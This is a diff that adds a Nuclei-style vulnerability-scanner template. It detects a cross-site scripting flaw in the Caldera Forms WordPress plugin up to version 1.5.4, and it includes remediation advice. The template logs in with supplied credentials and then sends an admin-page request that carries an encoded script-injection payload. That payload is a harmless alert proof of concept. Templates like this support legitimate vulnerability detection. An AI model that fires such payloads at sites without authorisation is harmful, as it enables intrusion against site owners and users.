@@ -1,0 +1,56 @@
+id: wp-caldera-forms-xss
+
+info:
+  name: Caldera Forms <= 1.5.4 - Cross-Site Scripting
+  author: theamanrawat
+  severity: medium
+  description: |
+    The Caldera Forms WordPress plugin before 1.5.4 is affected by an cross-site scripting (XSS) vulnerability. Due to insufficient input sanitization and output escaping, attackers can inject arbitrary JavaScript via form submissions, which is then executed for users viewing entries or confirmations.
+  impact: |
+    Attackers can inject malicious scripts into forms, potentially leading to session hijacking or theft of sensitive information when users (including admins) view injected entries.
+  remediation: |
+    Update the Caldera Forms plugin to version 1.5.5 or later.
+  reference:
+    - https://wpscan.com/vulnerability/c70219da-eab2-4d0b-ac5a-77f6d565ef31
+    - https://wordpress.org/plugins/caldera-forms
+  classification:
+    cwe-id: CWE-79
+    cpe: cpe:2.3:a:calderaf:caldera_forms:*:*:*:*:*:wordpress:*:*
+  metadata:
+    verified: true
+    max-requests: 1
+    public-www: "/wp-content/plugins/caldera-forms/"
+  tags: wordpress,wp,wp-plugin,caldera-forms,xss,vuln,wpscan
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 302
+          - contains(header, "wordpress_logged_in")
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET /wp-admin/admin.php?page=caldera-forms&edit=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+          - 'contains_all(body, "caldera-forms", "form_id_field", "<script>alert(document.domain)</script>")'
+        condition: and
+# digest: 4a0a004730450221009ad54326f17b414a4973a9f9500453647d593696c24e282fc2543b3809fa2c8002205559d5f46534e23fea6326889d5c6d7cdfe3411679d3662e7b517ca65098bb9d:922c64590222798bb761d5b6d8e72950
